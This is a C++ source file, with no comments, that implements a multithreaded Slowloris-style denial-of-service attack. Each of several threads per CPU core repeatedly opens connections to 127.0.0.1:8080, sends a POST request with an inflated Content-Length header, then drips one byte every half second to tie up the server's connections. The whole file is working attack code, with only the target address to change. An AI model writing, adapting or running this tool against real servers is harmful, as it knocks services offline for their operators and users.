#include <iostream>
#include <string>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <thread>
#include <vector>
void slowloris_worker() {
    sockaddr_in serv_addr;
    std::memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(8080);
    inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr);
    while (true) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
            close(sock);
            continue;
        }
        std::string payload(8192, 'A');
        std::string request =
            "POST / HTTP/1.1\r\n"
            "Host: 127.0.0.1:8080\r\n"
            "Content-Length: 50000\r\n"
            "\r\n" + payload;
        send(sock, request.c_str(), request.length(), 0);
        while (true) {
            if (send(sock, "A", 1, 0) < 0) {
                break;
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
        }
        close(sock);
    }
}
int main() {
    const unsigned int threads_count = std::thread::hardware_concurrency() * 4;
    std::vector<std::thread> threads;
    for (unsigned int i = 0; i < threads_count; i++) {
        threads.emplace_back(slowloris_worker);
    }
    for (auto& th : threads) {
        if (th.joinable()) {
            th.join();
        }
    }
    return 0;
}
